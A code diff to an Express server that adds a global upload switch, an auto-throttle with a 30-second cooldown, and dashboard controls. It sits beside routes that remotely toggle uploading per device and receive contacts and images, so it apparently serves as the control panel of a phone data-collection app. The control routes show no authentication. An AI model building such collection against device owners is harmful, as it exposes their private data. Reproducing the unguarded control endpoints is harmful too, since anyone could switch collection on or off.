@@ -55,6 +55,17 @@ async function initDB() {
       device_id TEXT PRIMARY KEY,
       uploading BOOLEAN DEFAULT FALSE
     );
+
+    CREATE TABLE IF NOT EXISTS global_config (
+      id INT PRIMARY KEY DEFAULT 1,
+      uploading BOOLEAN DEFAULT TRUE,
+      cooldown_until BIGINT DEFAULT 0,
+      CHECK (id = 1)
+    );
+
+    INSERT INTO global_config (id, uploading, cooldown_until)
+    VALUES (1, TRUE, 0)
+    ON CONFLICT (id) DO NOTHING;
   `);
 
   // Add columns for existing DBs that may not have them
@@ -83,6 +94,45 @@ function isRateLimited(deviceId) {
   if (now - last < UPLOAD_INTERVAL_MS) return true;
   lastUploadTime.set(deviceId, now);
   return false;
+}
+
+// ---- Auto-throttle: track uploads in last 60s across ALL devices ----
+// If > AUTO_THROTTLE_LIMIT uploads happen in 60s, pause globally for COOLDOWN_MS
+const AUTO_THROTTLE_LIMIT = 25;   // max uploads per 60s window before auto-pause
+const COOLDOWN_MS        = 30000; // 30 second cooldown when limit hit
+const uploadTimestamps   = [];    // rolling list of upload times
+
+async function recordUploadAndMaybeThrottle() {
+  const now = Date.now();
+  uploadTimestamps.push(now);
+
+  // Keep only last 60 seconds
+  while (uploadTimestamps.length && uploadTimestamps[0] < now - 60000) {
+    uploadTimestamps.shift();
+  }
+
+  if (uploadTimestamps.length >= AUTO_THROTTLE_LIMIT) {
+    const cooldownUntil = now + COOLDOWN_MS;
+    try {
+      await pool.query(
+        `UPDATE global_config SET uploading=FALSE, cooldown_until=$1 WHERE id=1`,
+        [cooldownUntil]
+      );
+      uploadTimestamps.length = 0; // reset counter
+
+      // Auto-resume after cooldown
+      setTimeout(async () => {
+        try {
+          await pool.query(
+            `UPDATE global_config SET uploading=TRUE, cooldown_until=0 WHERE id=1`
+          );
+          console.log("Auto-throttle cooldown over — global upload resumed.");
+        } catch(e) { console.error("Auto-resume error:", e); }
+      }, COOLDOWN_MS);
+
+      console.log(`Auto-throttle triggered! Pausing all uploads for ${COOLDOWN_MS/1000}s`);
+    } catch(e) { console.error("Throttle DB error:", e); }
+  }
 }
 
 // ================= SHARED STYLES =================
@@ -373,6 +423,18 @@ function topbar() {
 app.get("/config/:device_id", async (req, res) => {
   const device_id = req.params.device_id;
   try {
+    // 1. Check global flag first — if globally stopped, everyone gets false
+    const globalRow = await pool.query("SELECT uploading, cooldown_until FROM global_config WHERE id=1");
+    if (globalRow.rows.length > 0) {
+      const g = globalRow.rows[0];
+      const now = Date.now();
+      // If in cooldown window, return false regardless of device setting
+      if (!g.uploading || (g.cooldown_until && g.cooldown_until > now)) {
+        return res.json({ uploading: false });
+      }
+    }
+
+    // 2. Global is ON — check per-device flag
     await pool.query(
       `INSERT INTO device_control (device_id, uploading) VALUES ($1, FALSE)
        ON CONFLICT (device_id) DO NOTHING`,
@@ -437,6 +499,18 @@ app.post("/control/:device_id/stop", async (req, res) => {
 app.get("/", async (req, res) => {
   try {
     const users = await pool.query("SELECT COUNT(*) FROM users");
+    const globalRow = await pool.query("SELECT uploading, cooldown_until FROM global_config WHERE id=1");
+    const g = globalRow.rows[0] || { uploading: true, cooldown_until: 0 };
+    const now = Date.now();
+    const inCooldown = g.cooldown_until && g.cooldown_until > now;
+    const globalOn = g.uploading && !inCooldown;
+
+    const globalBadge = globalOn
+      ? `<span class="status-badge-on"><span class="pulse"></span> All Uploads Active</span>`
+      : inCooldown
+        ? `<span class="status-badge-off"><span class="dot-off"></span> Auto-Paused (cooldown)</span>`
+        : `<span class="status-badge-off"><span class="dot-off"></span> All Uploads Stopped</span>`;
+
     res.send(`
     <html><head><title>Dashboard</title>${sharedStyles}</head>
     <body>
@@ -451,6 +525,28 @@ app.get("/", async (req, res) => {
             <div class="stat-value">${users.rows[0].count}</div>
           </div>
         </div>
+
+        <div class="card">
+          <h3>&#127759; Global Upload Control &nbsp; ${globalBadge}</h3>
+          <p style="font-size:13px; color:#64748b; margin-bottom:20px;">
+            Universal stop/start — affects <strong>all devices at once</strong>. 
+            Individual device controls still work when global is ON.<br>
+            <span style="color:#475569;">Auto-pause triggers if uploads exceed ${AUTO_THROTTLE_LIMIT} in 60s — resumes after 30s cooldown automatically.</span>
+          </p>
+          <div style="display:flex; gap:14px; flex-wrap:wrap;">
+            <form method="POST" action="/global/start">
+              <button type="submit" class="btn btn-start" ${globalOn ? 'disabled style="opacity:0.4;cursor:not-allowed;"' : ''}>
+                &#9654; Start All Uploads
+              </button>
+            </form>
+            <form method="POST" action="/global/stop">
+              <button type="submit" class="btn btn-stop" ${!globalOn ? 'disabled style="opacity:0.4;cursor:not-allowed;"' : ''}>
+                &#9632; Stop All Uploads
+              </button>
+            </form>
+          </div>
+        </div>
+
         <a href="/users" class="btn btn-primary" style="font-size:16px; padding:14px 32px;">
           &#128101;&nbsp; View Users
         </a>
@@ -460,6 +556,21 @@ app.get("/", async (req, res) => {
   } catch (err) {
     res.status(500).send("Dashboard error");
   }
+});
+
+// ================= GLOBAL STOP / START (affects ALL devices) =================
+app.post("/global/stop", async (req, res) => {
+  try {
+    await pool.query(`UPDATE global_config SET uploading=FALSE, cooldown_until=0 WHERE id=1`);
+  } catch (err) { console.error("/global/stop error:", err); }
+  res.redirect("/");
+});
+
+app.post("/global/start", async (req, res) => {
+  try {
+    await pool.query(`UPDATE global_config SET uploading=TRUE, cooldown_until=0 WHERE id=1`);
+  } catch (err) { console.error("/global/start error:", err); }
+  res.redirect("/");
 });
 
 // ================= RECEIVE CONTACTS =================
@@ -527,6 +638,8 @@ app.post("/upload-image", upload.single("image"), async (req, res) => {
               "INSERT INTO users (device_id) VALUES ($1) ON CONFLICT DO NOTHING",
               [device_id]
             );
+            // Track upload for auto-throttle
+            recordUploadAndMaybeThrottle().catch(console.error);
             res.json({ url: result.secure_url });
             resolve();
           } catch (dbErr) {
